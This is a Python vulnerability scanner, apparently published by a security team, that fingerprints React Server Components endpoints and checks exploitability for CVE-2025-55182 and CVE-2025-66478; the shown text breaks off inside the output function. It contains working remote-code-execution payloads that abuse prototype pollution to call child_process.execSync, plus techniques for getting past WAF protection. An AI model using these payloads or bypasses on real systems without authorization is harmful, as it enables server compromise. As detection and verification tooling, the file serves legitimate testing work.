#!/usr/bin/env python3
"""
ore_rsc.py - React2Shell RSC Vulnerability Scanner

Developed by: Rapticore Security Research Team

Fast scanner for React Server Components (RSC) vulnerabilities:
  - CVE-2025-55182 (React2Shell) - RCE via Flight protocol deserialization
  - CVE-2025-66478 - Next.js server action vulnerability

Features:
  - Passive detection mode (default): Fingerprints RSC endpoints
  - Active verification mode (--verify): Confirms exploitability with PoC
  - Safe side-channel mode (--safe-check): Non-exploitative verification
  - WAF bypass techniques for hardened targets
  - Async concurrent scanning for speed
  - Framework fingerprinting (Next.js, Remix, Waku)
  - Mitigation detection (Vercel, Netlify)
  - Multiple output formats (console, CSV, JSON)

Acknowledgments:
  - Assetnote: Original CVE-2025-55182 (React2Shell) vulnerability research

IMPORTANT: Only use this tool on domains you own or have explicit
           authorization to test.

Usage:
    # Passive scan (detection only)
    python ore_rsc.py example.com

    # Active verification (sends PoC payload)
    python ore_rsc.py example.com --verify

    # Safe side-channel check (non-exploitative)
    python ore_rsc.py example.com --safe-check

    # With WAF bypass
    python ore_rsc.py example.com --verify --waf-bypass

    # Deep scan with all paths
    python ore_rsc.py example.com --deep --verify
"""

import argparse
import asyncio
import csv
import json
import random
import re
import string
import sys
import time
from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone
from enum import Enum
from typing import List, Optional, Set, Dict, Tuple
from urllib.parse import urljoin, urlparse

try:
    import aiohttp
except ImportError:
    print("Error: aiohttp is required. Install with: pip install aiohttp")
    sys.exit(1)


# Module exports for use as library
__all__ = [
    'RSCScanner',
    'ScanResult',
    'RiskLevel',
    'VulnerabilityStatus',
    'DEFAULT_RSC_PATHS',
    'DEEP_SCAN_PATHS',
    'RSC_CONTENT_TYPES',
    'RSC_INDICATOR_HEADERS',
    'FLIGHT_PATTERNS',
    'FRAMEWORK_SIGNATURES',
    'MITIGATION_INDICATORS',
]


class RiskLevel(Enum):
    """Risk level classification for detected endpoints."""
    CRITICAL = "CRITICAL"  # Confirmed vulnerable
    HIGH = "HIGH"          # RSC content type + server actions
    MEDIUM = "MEDIUM"      # RSC content type detected
    LOW = "LOW"            # RSC indicators present
    INFO = "INFO"          # Possible RSC patterns


class VulnerabilityStatus(Enum):
    """Verification status for active checks."""
    CONFIRMED = "CONFIRMED"      # Exploitation successful
    LIKELY = "LIKELY"            # Side-channel indicates vulnerable
    MITIGATED = "MITIGATED"      # WAF or platform mitigation detected
    NOT_VULNERABLE = "NOT_VULNERABLE"
    UNKNOWN = "UNKNOWN"          # Could not determine


# Common RSC/Flight endpoint paths to probe
DEFAULT_RSC_PATHS = [
    "/",
    "/_rsc",
    "/_next/rsc",
    "/_next/data",
    "/rsc",
    "/api/rsc",
    "/flight",
    "/__flight",
    "/_flight",
    "/api/__rsc",
    "/__rsc__",
    "/action",
]

# Extended paths for deep scanning
DEEP_SCAN_PATHS = [
    "/_next/static/chunks",
    "/_next/image",
    "/api/auth",
    "/api/trpc",
    "/__nextjs_original-stack-frame",
    "/_vercel/insights",
    "/server-action",
    "/api/server-action",
    "/_server",
    "/rpc",
    "/api/rpc",
    "/en",      # Common locale redirects
    "/en-US",
    "/app",
    "/dashboard",
    "/admin",
]

# RSC-related content types that indicate Flight protocol
RSC_CONTENT_TYPES = [
    "text/x-component",
    "application/x-component",
    "text/x-rsc",
    "text/x-flight",
]

# Headers that indicate RSC usage
RSC_INDICATOR_HEADERS = [
    "x-nextjs-cache",
    "x-matched-path",
    "rsc",
    "next-router-state-tree",
    "next-router-prefetch",
    "next-url",
    "x-middleware-rewrite",
    "x-middleware-redirect",
    "x-nextjs-matched-path",
    "x-action-redirect",  # Server action redirect
    "next-action",        # Server action header
]

# Flight protocol patterns in response body
FLIGHT_PATTERNS = [
    r'^0:',              # Stream chunk format
    r'^1:',
    r'^2:',
    r'^\$',              # React element reference
    r'^\["?\$',          # Array with React element
    r'\$ACTION_ID',      # Server action marker
    r'\$ACTION_',        # Action reference
    r'\$undefined',      # Special undefined marker
    r'"formState":\s*\[', # Form state in RSC
    r'\$Sreact\.transition',  # React transition
    r'\$Sreact\.suspense',    # React suspense
    r'"id":\s*"[a-f0-9]{40}"', # Action ID hash pattern
]

# Framework detection signatures
FRAMEWORK_SIGNATURES = {
    "nextjs": {
        "headers": ["x-nextjs-cache", "x-powered-by"],
        "header_values": {"x-powered-by": "next.js"},
        "body_patterns": [r"/_next/", r"__NEXT_DATA__", r'"buildId"'],
    },
    "remix": {
        "headers": ["x-remix-response"],
        "body_patterns": [r"__remixContext", r"remix"],
    },
    "waku": {
        "body_patterns": [r"waku", r"__waku"],
    },
}

# Mitigation detection
MITIGATION_INDICATORS = {
    "vercel": {
        "headers": {"server": "vercel"},
    },
    "netlify": {
        "headers": {"server": "netlify", "netlify-vary": None},
    },
    "cloudflare": {
        "headers": {"server": "cloudflare", "cf-ray": None},
    },
}


def generate_junk_data(size_bytes: int) -> Tuple[str, str]:
    """Generate random junk data for WAF bypass."""
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
    return param_name, junk


def build_safe_payload() -> Tuple[str, str]:
    """Build safe side-channel detection payload (non-exploitative)."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_rce_payload(windows: bool = False, waf_bypass: bool = False,
                      waf_bypass_size_kb: int = 128) -> Tuple[str, str]:
    """Build RCE PoC payload for verification."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    if windows:
        cmd = 'powershell -c \\"41*271\\"'
    else:
        cmd = 'echo $((41*271))'

    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    parts = []

    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb * 1024)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_vercel_waf_bypass_payload() -> Tuple[str, str]:
    """Build Vercel-specific WAF bypass payload."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;'
        'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
        '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
    )

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="3"\r\n\r\n'
        f'{{"\\"\u0024\u0024":{{}}}}\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


@dataclass
class ScanResult:
    """Result of scanning a single URL."""
    url: str
    domain: str
    path: str
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    is_rsc_endpoint: bool = False
    rsc_indicators: List[str] = field(default_factory=list)
    error: Optional[str] = None
    response_time_ms: Optional[float] = None
    risk_level: RiskLevel = RiskLevel.INFO
    framework: Optional[str] = None
    has_server_actions: bool = False
    response_headers: Dict[str, str] = field(default_factory=dict)
    vulnerability_status: VulnerabilityStatus = VulnerabilityStatus.UNKNOWN
    mitigation_detected: Optional[str] = None
    final_url: Optional[str] = None  # After redirects
    verification_details: Optional[str] = None

    def calculate_risk(self) -> None:
        """Calculate risk level based on detected indicators.

        Risk levels are conservative - only confirmed exploitation is CRITICAL/HIGH.
        Passive detection indicates potential attack surface, not confirmed vulnerability.

        CRITICAL: Exploitation confirmed via --verify (RCE payload succeeded)
        HIGH: Likely vulnerable via --safe-check (side-channel confirmed)
        MEDIUM: RSC endpoint with server actions (potential attack surface)
        LOW: RSC endpoint detected (Flight protocol present)
        INFO: RSC indicators present (headers/patterns)
        """
        # CRITICAL: Only when exploitation is confirmed
        if self.vulnerability_status == VulnerabilityStatus.CONFIRMED:
            self.risk_level = RiskLevel.CRITICAL
            return

        # HIGH: Side-channel indicates likely vulnerable
        if self.vulnerability_status == VulnerabilityStatus.LIKELY:
            self.risk_level = RiskLevel.HIGH
            return

        # For passive mode (no verification), be conservative
        # These indicate potential attack surface, NOT confirmed vulnerability

        has_rsc_content_type = any("content-type" in i for i in self.rsc_indicators)
        has_flight_patterns = any("flight-pattern" in i for i in self.rsc_indicators)
        has_action_ids = any("action" in i.lower() for i in self.rsc_indicators)
        indicator_count = len(self.rsc_indicators)

        # MEDIUM: Server actions detected - potential attack vector
        if self.has_server_actions and has_rsc_content_type:
            self.risk_level = RiskLevel.MEDIUM
        # LOW: RSC content type with Flight protocol
        elif has_rsc_content_type and has_flight_patterns:
            self.risk_level = RiskLevel.LOW
        # LOW: Multiple indicators suggest RSC
        elif indicator_count >= 4:
            self.risk_level = RiskLevel.LOW
        # INFO: Basic RSC indicators
        elif indicator_count >= 1:
            self.risk_level = RiskLevel.INFO
        else:
            self.risk_level = RiskLevel.INFO


class RSCScanner:
    """Advanced async scanner for React Server Components vulnerabilities."""

    def __init__(
            self,
            concurrency: int = 20,
            timeout: float = 10.0,
            rate_limit: float = 0.0,
            paths: Optional[List[str]] = None,
            user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            follow_redirects: bool = True,
            verify_ssl: bool = True,
            deep_scan: bool = False,
            verify_mode: bool = False,
            safe_check: bool = False,
            windows: bool = False,
            waf_bypass: bool = False,
            waf_bypass_size_kb: int = 128,
            vercel_waf_bypass: bool = False,
    ):
        self.concurrency = concurrency
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.rate_limit = rate_limit
        self.deep_scan = deep_scan
        self.verify_mode = verify_mode
        self.safe_check = safe_check
        self.windows = windows
        self.waf_bypass = waf_bypass
        self.waf_bypass_size_kb = waf_bypass_size_kb
        self.vercel_waf_bypass = vercel_waf_bypass

        # Combine paths based on scan mode
        if paths:
            self.paths = paths
        elif deep_scan:
            self.paths = list(set(DEFAULT_RSC_PATHS + DEEP_SCAN_PATHS))
        else:
            self.paths = DEFAULT_RSC_PATHS

        self.user_agent = user_agent
        self.follow_redirects = follow_redirects
        self.verify_ssl = verify_ssl
        self.semaphore: Optional[asyncio.Semaphore] = None
        self.results: List[ScanResult] = []
        self.scanned_count = 0
        self.total_urls = 0
        self.frameworks_detected: Dict[str, str] = {}
        self.verified_vulnerable: List[str] = []

    def _normalize_domain(self, domain: str) -> str:
        """Ensure domain has a scheme."""
        domain = domain.strip()
        if not domain:
            return ""
        if not domain.startswith(("http://", "https://")):
            domain = f"https://{domain}"
        return domain.rstrip("/")

    def _generate_urls(self, domains: List[str]) -> List[tuple]:
        """Generate (domain, path, full_url) tuples for all domains and paths."""
        urls = []
        seen: Set[str] = set()

        for domain in domains:
            base = self._normalize_domain(domain)
            if not base:
                continue

            parsed = urlparse(base)
            domain_name = parsed.netloc

            for path in self.paths:
                full_url = urljoin(base + "/", path.lstrip("/"))
                if full_url not in seen:
                    seen.add(full_url)
                    urls.append((domain_name, path, full_url))

        return urls

    def _detect_framework(self, headers: Dict[str, str], body: str) -> Optional[str]:
        """Detect the RSC framework being used."""
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}

        for framework, signatures in FRAMEWORK_SIGNATURES.items():
            for header in signatures.get("headers", []):
                if header.lower() in headers_lower:
                    if "header_values" in signatures:
                        expected = signatures["header_values"].get(header, "").lower()
                        if expected and expected in headers_lower.get(header.lower(), ""):
                            return framework
                    else:
                        return framework

            for pattern in signatures.get("body_patterns", []):
                if re.search(pattern, body, re.IGNORECASE):
                    return framework

        return None

    def _detect_mitigation(self, headers: Dict[str, str]) -> Optional[str]:
        """Detect if a WAF or platform mitigation is in place."""
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}

        for platform, indicators in MITIGATION_INDICATORS.items():
            for header, expected_value in indicators.get("headers", {}).items():
                header_lower = header.lower()
                if header_lower in headers_lower:
                    if expected_value is None:
                        return platform
                    elif expected_value.lower() in headers_lower.get(header_lower, ""):
                        return platform

        return None

    def _check_flight_patterns(self, body: str) -> List[str]:
        """Check for Flight protocol patterns in response body."""
        matches = []
        for pattern in FLIGHT_PATTERNS:
            if re.search(pattern, body, re.MULTILINE):
                matches.append(f"flight-pattern:{pattern[:30]}")
        return matches

    def _check_server_actions(self, body: str, headers: Dict[str, str]) -> bool:
        """Check if server actions are present."""
        action_markers = [
            r'\$ACTION_ID',
            r'\$ACTION_',
            r'action="[^"]*"[^>]*formAction',
            r'formAction=',
            r'"actionId":\s*"',
            r'"id":\s*"[a-f0-9]{40}"',  # Action hash pattern
            r'"bound":\s*null',          # Unbound action
        ]
        for marker in action_markers:
            if re.search(marker, body, re.IGNORECASE):
                return True

        action_headers = ["x-action", "next-action", "x-action-redirect"]
        for header in action_headers:
            if header.lower() in [h.lower() for h in headers.keys()]:
                return True

        return False

    def _is_vulnerable_safe_check(self, status_code: int, body: str,
                                   headers: Dict[str, str]) -> Tuple[bool, str]:
        """Check if response indicates vulnerability via safe side-channel."""
        if status_code != 500:
            return False, "Status code not 500"

        if 'E{"digest"' not in body:
            return False, "Error digest not found"

        # Check for mitigations
        mitigation = self._detect_mitigation(headers)
        if mitigation:
            return False, f"Mitigated by {mitigation}"

        return True, "Side-channel indicates vulnerable (500 + error digest)"

    def _is_vulnerable_rce_check(self, headers: Dict[str, str]) -> Tuple[bool, str]:
        """Check if response indicates successful RCE exploitation."""
        redirect_header = headers.get("x-action-redirect", "")
        if re.search(r'.*/login\?a=11111.*', redirect_header):
            return True, f"RCE confirmed via X-Action-Redirect: {redirect_header}"
        return False, "RCE payload did not trigger expected redirect"

    async def _resolve_redirects(self, session: aiohttp.ClientSession,
                                  url: str, max_redirects: int = 5) -> str:
        """Follow same-host redirects to find actual endpoint."""
        current_url = url
        original_host = urlparse(url).netloc

        for _ in range(max_redirects):
            try:
                async with session.head(
                    current_url,
                    allow_redirects=False,
                    ssl=self.verify_ssl if self.verify_ssl else False,
                ) as response:
                    if response.status in (301, 302, 303, 307, 308):
                        location = response.headers.get("Location", "")
                        if location:
                            if location.startswith("/"):
                                parsed = urlparse(current_url)
                                current_url = f"{parsed.scheme}://{parsed.netloc}{location}"
                            else:
                                new_host = urlparse(location).netloc
                                if new_host == original_host:
                                    current_url = location
                                else:
                                    break
                        else:
                            break
                    else:
                        break
            except Exception:
                break

        return current_url

    async def _verify_vulnerability(self, session: aiohttp.ClientSession,
                                     url: str, result: ScanResult) -> None:
        """Actively verify if endpoint is vulnerable."""
        # Build payload based on mode
        if self.safe_check:
            body, content_type = build_safe_payload()
        elif self.vercel_waf_bypass:
            body, content_type = build_vercel_waf_bypass_payload()
        else:
            body, content_type = build_rce_payload(
                windows=self.windows,
                waf_bypass=self.waf_bypass,
                waf_bypass_size_kb=self.waf_bypass_size_kb
            )

        headers = {
            "User-Agent": self.user_agent,
            "Content-Type": content_type,
            "Next-Action": "x",
            "X-Nextjs-Request-Id": "b5dce965",
            "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
        }

        try:
            # First resolve redirects
            final_url = await self._resolve_redirects(session, url)
            result.final_url = final_url

            async with session.post(
                final_url,
                headers=headers,
                data=body.encode('utf-8'),
                allow_redirects=False,
                ssl=self.verify_ssl if self.verify_ssl else False,
            ) as response:
                resp_body = await response.text()
                resp_headers = dict(response.headers)

                # Check for mitigation first
                mitigation = self._detect_mitigation(resp_headers)
                if mitigation:
                    result.mitigation_detected = mitigation
                    result.vulnerability_status = VulnerabilityStatus.MITIGATED
                    result.verification_details = f"Protected by {mitigation}"
                    return

                if self.safe_check:
                    is_vuln, details = self._is_vulnerable_safe_check(
                        response.status, resp_body, resp_headers
                    )
                    if is_vuln:
                        result.vulnerability_status = VulnerabilityStatus.LIKELY
                        result.verification_details = details
                    else:
                        result.vulnerability_status = VulnerabilityStatus.NOT_VULNERABLE
                        result.verification_details = details
                else:
                    is_vuln, details = self._is_vulnerable_rce_check(resp_headers)
                    if is_vuln:
                        result.vulnerability_status = VulnerabilityStatus.CONFIRMED
                        result.verification_details = details
                        self.verified_vulnerable.append(url)
                    else:
                        result.vulnerability_status = VulnerabilityStatus.NOT_VULNERABLE
                        result.verification_details = details

        except Exception as e:
            result.verification_details = f"Verification failed: {str(e)[:50]}"

    async def _check_url(
            self,
            session: aiohttp.ClientSession,
            domain: str,
            path: str,
            url: str
    ) -> ScanResult:
        """Check a single URL for RSC indicators and optionally verify."""
        result = ScanResult(url=url, domain=domain, path=path)

        async with self.semaphore:
            if self.rate_limit > 0:
                await asyncio.sleep(self.rate_limit)

            start_time = time.monotonic()

            try:
                # Enhanced headers for better RSC detection
                headers = {
                    "Accept": "text/x-component, text/html, application/json, */*;q=0.5",
                    "User-Agent": self.user_agent,
                    "RSC": "1",
                    "Next-Router-State-Tree": "%5B%22%22%2C%7B%7D%5D",
                    "Next-Router-Prefetch": "1",
                    "Next-Url": path,
                    "X-Nextjs-Request-Id": "b5dce965",
                    "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
                }

                async with session.get(
                        url,
                        headers=headers,
                        allow_redirects=self.follow_redirects,
                        ssl=self.verify_ssl if self.verify_ssl else False,
                ) as response:
                    result.status_code = response.status
                    result.content_type = response.headers.get("Content-Type", "")
                    result.response_time_ms = (time.monotonic() - start_time) * 1000
                    result.response_headers = dict(response.headers)

                    # Check for RSC content types
                    ct_lower = result.content_type.lower()
                    for rsc_ct in RSC_CONTENT_TYPES:
                        if rsc_ct in ct_lower:
                            result.is_rsc_endpoint = True
                            result.rsc_indicators.append(f"content-type:{rsc_ct}")

                    # Check for RSC indicator headers
                    for header in RSC_INDICATOR_HEADERS:
                        if header.lower() in [h.lower() for h in response.headers]:
                            result.rsc_indicators.append(f"header:{header}")

                    # Detect mitigation
                    mitigation = self._detect_mitigation(dict(response.headers))
                    if mitigation:
                        result.mitigation_detected = mitigation

                    # Read body for analysis
                    try:
                        body_bytes = await response.content.read(16384)  # Increased to 16KB
                        body_text = body_bytes.decode("utf-8", errors="ignore")

                        # Detect framework
                        framework = self._detect_framework(dict(response.headers), body_text)
                        if framework:
                            result.framework = framework
                            self.frameworks_detected[domain] = framework

                        # Check for Flight protocol patterns
                        if "text/html" not in ct_lower:
                            flight_matches = self._check_flight_patterns(body_text)
                            result.rsc_indicators.extend(flight_matches)
                            if flight_matches:
                                result.is_rsc_endpoint = True

                        # Check for server actions
                        if self._check_server_actions(body_text, dict(response.headers)):
                            result.has_server_actions = True
                            result.rsc_indicators.append("server-actions-detected")

                        # Legacy Flight checks
                        flight_markers = ["0:", "1:", "2:", "$", '["$']
                        if any(body_text.strip().startswith(m) for m in flight_markers):
                            if "text/html" not in ct_lower:
                                if "body:flight-protocol-markers" not in result.rsc_indicators:
                                    result.rsc_indicators.append("body:flight-protocol-markers")
                                    result.is_rsc_endpoint = True

                    except Exception:
                        pass

                    # Flag as RSC if multiple indicators
                    if result.rsc_indicators and not result.is_rsc_endpoint:
                        if len(result.rsc_indicators) >= 2:
                            result.is_rsc_endpoint = True

                    # Calculate initial risk level
                    result.calculate_risk()

                    # Active verification if enabled and RSC detected
                    if (self.verify_mode or self.safe_check) and result.is_rsc_endpoint:
                        await self._verify_vulnerability(session, url, result)
                        result.calculate_risk()  # Recalculate after verification

            except asyncio.TimeoutError:
                result.error = "timeout"
            except aiohttp.ClientSSLError as e:
                result.error = f"ssl_error: {str(e)[:50]}"
            except aiohttp.ClientConnectorError as e:
                result.error = f"connection_error: {str(e)[:50]}"
            except Exception as e:
                result.error = f"error: {str(e)[:50]}"

            self.scanned_count += 1

            return result

    async def _progress_reporter(self, interval: float = 2.0):
        """Report progress periodically."""
        while self.scanned_count < self.total_urls:
            pct = (self.scanned_count / self.total_urls * 100) if self.total_urls else 0
            hits = sum(1 for r in self.results if r.is_rsc_endpoint)
            confirmed = len(self.verified_vulnerable)
            status = f"[*] Progress: {self.scanned_count}/{self.total_urls} ({pct:.1f}%) | RSC: {hits}"
            if self.verify_mode or self.safe_check:
                status += f" | Confirmed: {confirmed}"
            print(f"\r{status}", end="", flush=True)
            await asyncio.sleep(interval)
        print()

    async def scan(self, domains: List[str], show_progress: bool = True) -> List[ScanResult]:
        """Scan all domains for RSC endpoints."""
        urls = self._generate_urls(domains)
        self.total_urls = len(urls)
        self.scanned_count = 0
        self.results = []
        self.verified_vulnerable = []

        if not urls:
            print("[!] No valid URLs to scan")
            return []

        print(f"[+] Scanning {len(urls)} URLs across {len(domains)} domain(s)")
        print(f"[+] Concurrency: {self.concurrency}, Paths per domain: {len(self.paths)}")
        if self.verify_mode:
            print("[+] Active verification mode enabled (sends PoC payload)")
        elif self.safe_check:
            print("[+] Safe side-channel check enabled (non-exploitative)")
        if self.waf_bypass:
            print(f"[+] WAF bypass enabled ({self.waf_bypass_size_kb}KB junk data)")
        if self.vercel_waf_bypass:
            print("[+] Vercel WAF bypass mode enabled")

        self.semaphore = asyncio.Semaphore(self.concurrency)

        # Increase timeout for WAF bypass mode
        timeout_seconds = self.timeout.total
        if self.waf_bypass and timeout_seconds < 20:
            timeout_seconds = 20
        adjusted_timeout = aiohttp.ClientTimeout(total=timeout_seconds)

        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=min(10, self.concurrency),
            ssl=self.verify_ssl if self.verify_ssl else False,
        )

        async with aiohttp.ClientSession(
                timeout=adjusted_timeout,
                connector=connector,
        ) as session:
            tasks = [
                self._check_url(session, domain, path, url)
                for domain, path, url in urls
            ]

            progress_task = None
            if show_progress:
                progress_task = asyncio.create_task(self._progress_reporter())

            self.results = await asyncio.gather(*tasks)

            if progress_task:
                progress_task.cancel()
                try:
                    await progress_task
                except asyncio.CancelledError:
                    pass

        return self.results

    def get_rsc_endpoints(self) -> List[ScanResult]:
        """Return only results that appear to be RSC endpoints."""
        return [r for r in self.results if r.is_rsc_endpoint]

    def get_verified_vulnerable(self) -> List[ScanResult]:
        """Return only confirmed vulnerable endpoints."""
        return [r for r in self.results
                if r.vulnerability_status in (VulnerabilityStatus.CONFIRMED,
                                               VulnerabilityStatus.LIKELY)]

    def get_errors(self) -> List[ScanResult]:
        """Return results that had errors."""
        return [r for r in self.results if r.error]


def load_domains_from_file(filepath: str) -> List[str]:
    """Load domains from a file (one per line)."""
    domains = []
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    domains.append(line)
    except Exception as e:
        print(f"[!] Error reading file {filepath}: {e}")
        sys.exit(1)
    return domains


def output_results(
        results: List[ScanResult],
        rsc_only: bool = False,
        format: str = "console",
        output_file: Optional[str] = None,
        frameworks_detected: Optional[Dict[str, str]] = None,
        verify_mode: bool = False,
        safe_check: bool = False,
):
    """Output results in the specified format."""
    if rsc_only:
        results = [r for r in results if r.is_rsc_endpoint]

    # Sort by risk level
    risk_order = {RiskLevel.CRITICAL: 0, RiskLevel.HIGH: 1, RiskLevel.MEDIUM: 2,
                  RiskLevel.LOW: 3, RiskLevel.INFO: 4}
    results = sorted(results, key=lambda r: risk_order.get(r.risk_level, 5))

    if format == "json":
        risk_counts = {}
        for level in RiskLevel:
            risk_counts[level.value] = sum(1 for r in results
                                           if r.risk_level == level and r.is_rsc_endpoint)

        vuln_counts = {}
        for status in VulnerabilityStatus:
            vuln_counts[status.value] = sum(1 for r in results
                                            if r.vulnerability_status == status)

        data = {
            "scan_time": datetime.now(timezone.utc).isoformat(),
            "total_scanned": len(results),
            "rsc_endpoints_found": sum(1 for r in results if r.is_rsc_endpoint),
            "risk_summary": risk_counts,
            "vulnerability_summary": vuln_counts,
            "frameworks_detected": frameworks_detected or {},
            "results": [],
        }

        for r in results:
            result_dict = asdict(r)
            result_dict["risk_level"] = r.risk_level.value
            result_dict["vulnerability_status"] = r.vulnerability_status.value
            result_dict.pop("response_headers", None)
            data["results"].append(result_dict)

        output = json.dumps(data, indent=2)

        if output_file:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(output)
            print(f"[+] Results saved to {output_file}")
        else:
            print(output)

    elif format == "csv":
        fieldnames = [
            "url", "domain", "path", "status_code", "content_type",
            "is_rsc_endpoint", "risk_level", "vulnerability_status",
            "framework", "has_server_actions", "mitigation_detected",
            "rsc_indicators", "verification_details", "error", "response_time_ms"
        ]

        output_target = open(output_file, "w", newline="", encoding="utf-8") if output_file else sys.stdout
        writer = csv.DictWriter(output_target, fieldnames=fieldnames)
        writer.writeheader()

        for r in results:
            row = {
                "url": r.url,
                "domain": r.domain,
                "path": r.path,
                "status_code": r.status_code,
                "content_type": r.content_type,
                "is_rsc_endpoint": r.is_rsc_endpoint,
                "risk_level": r.risk_level.value,
                "vulnerability_status": r.vulnerability_status.value,
                "framework": r.framework or "",
                "has_server_actions": r.has_server_actions,
                "mitigation_detected": r.mitigation_detected or "",
                "rsc_indicators": ";".join(r.rsc_indicators),
                "verification_details": r.verification_details or "",
                "error": r.error or "",
                "response_time_ms": r.response_time_ms,
            }
            writer.writerow(row)

        if output_file:
            output_target.close()
            print(f"[+] Results saved to {output_file}")

    else:  # console format
        rsc_endpoints = [r for r in results if r.is_rsc_endpoint]
        errors = [r for r in results if r.error]
        confirmed = [r for r in results if r.vulnerability_status == VulnerabilityStatus.CONFIRMED]
        likely = [r for r in results if r.vulnerability_status == VulnerabilityStatus.LIKELY]
        mitigated = [r for r in results if r.vulnerability_status == VulnerabilityStatus.MITIGATED]

        critical = [r for r in rsc_endpoints if r.risk_level == RiskLevel.CRITICAL]
        high = [r for r in rsc_endpoints if r.risk_level == RiskLevel.HIGH]
        medium = [r for r in rsc_endpoints if r.risk_level == RiskLevel.MEDIUM]
        low = [r for r in rsc_endpoints if r.risk_level == RiskLevel.LOW]

        print("\n" + "=" * 70)
        print("SCAN RESULTS")
        print("=" * 70)

        print("\n[*] RISK SUMMARY")
        print("-" * 40)
        print(f"  CRITICAL: {len(critical)}")
        print(f"  HIGH:     {len(high)}")
        print(f"  MEDIUM:   {len(medium)}")
        print(f"  LOW:      {len(low)}")

        if verify_mode or safe_check:
            print("\n[*] VERIFICATION SUMMARY")
            print("-" * 40)
            print(f"  CONFIRMED VULNERABLE: {len(confirmed)}")
            print(f"  LIKELY VULNERABLE:    {len(likely)}")
            print(f"  MITIGATED:            {len(mitigated)}")

        if frameworks_detected:
            print("\n[*] FRAMEWORKS DETECTED")
            print("-" * 40)
            for domain, framework in frameworks_detected.items():
                print(f"  {domain}: {framework}")

        if confirmed:
            print(f"\n[!!!] CONFIRMED VULNERABLE ENDPOINTS: {len(confirmed)}")
            print("-" * 70)
            for r in confirmed:
                print(f"\n  \033[91m\033[1m[CONFIRMED VULNERABLE]\033[0m {r.url}")
                print(f"     Status: {r.status_code}")
                print(f"     Framework: {r.framework or 'Unknown'}")
                print(f"     Verification: {r.verification_details}")
                if r.final_url and r.final_url != r.url:
                    print(f"     Final URL: {r.final_url}")

        if rsc_endpoints:
            print(f"\n[!] POTENTIAL RSC ENDPOINTS FOUND: {len(rsc_endpoints)}")
            print("-" * 70)

            for r in rsc_endpoints:
                risk_indicator = {
                    RiskLevel.CRITICAL: "\033[91m[CRITICAL]\033[0m",
                    RiskLevel.HIGH: "\033[93m[HIGH]\033[0m",
                    RiskLevel.MEDIUM: "\033[33m[MEDIUM]\033[0m",
                    RiskLevel.LOW: "\033[94m[LOW]\033[0m",
                }.get(r.risk_level, "[INFO]")

